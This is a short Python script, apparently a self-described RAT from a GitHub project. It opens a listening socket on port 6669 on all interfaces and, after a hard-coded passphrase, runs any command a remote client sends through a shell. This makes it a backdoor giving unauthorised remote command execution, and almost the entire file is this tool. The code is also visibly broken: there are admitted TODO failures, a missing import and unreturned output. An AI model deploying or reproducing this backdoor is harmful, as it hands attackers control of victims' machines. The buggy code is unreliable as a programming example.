#ECCENTRIC_HILLS - *NIX Server Deployment Binary
#Written by Gunnar Jones - @gunSec and Austin Crinkaw - @acrinklaw
#https://github.com/acrinklaw/eccentric_hills
#grabbing our libraries
import socket
import threading
import os
import subprocess

#grab some easy system info to pass to client upon connection

#Set server to accept connections from any interface, port 6669
BINDIP = "0.0.0.0"
BINDPORT = 6669
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((BINDIP,BINDPORT))

#server can handle up to 3 concurrent sessions
server.listen(3)

def commands(command):
    command = command.rstrip()
    if command[0] != "!":
        try:
            result =  subprocess.check_output(command,stderr=subprocess.
STDOUT, shell=True)
        except:
            #TODO:Exception always thrown no matter what command is sent
            result = "Failed to execute command.\n"
            return result

    elif command[0] == "!":
        command = command[1:]
        result = "nibba punch"
        return result

    else:
        sys.exit(1)

#main server functions, command parsing
def shell(clientSocket):
    while True:
        clientSocket.send("\n^-^")
        buffer = ""
        #TODO:While "/n" not in buffer does not work
        while "#" not in buffer:
            clientSocket.send("Waiting for command")
            buffer += clientSocket.recv(4096)

        #TODO:Use some terminating character and strip from string?
        buffer.strip("#")
        if buffer == 'quit':
            clientSocket.send("[*] Terminating Connection. Goodbye.")
            clientSocket.close()
            break

        #TODO: This breaks this script still, need to find out why
        elif buffer == "\n":
            continue

        else:
            output = commands(buffer)
            clientSocket.send(output)

#Client Handler, require predetermined hash/passphrase to establish connection
def handleClient(clientSocket):
    hashpass = clientSocket.recv(1024)
    if hashpass == 'gunclawpythonratniBBa':
        #send the w and uname to client, jump to shell loop
        clientSocket.send("\n[+] Accepted Connection\n")
        shell(clientSocket)

    else:
        clientSocket.close()


#Main, waiting for connection loop
def main():
    while True:
        client,addr = server.accept()
        clientHandler = threading.Thread(target=handleClient,args=(client,))
        clientHandler.start()


if __name__ == '__main__':
    main()
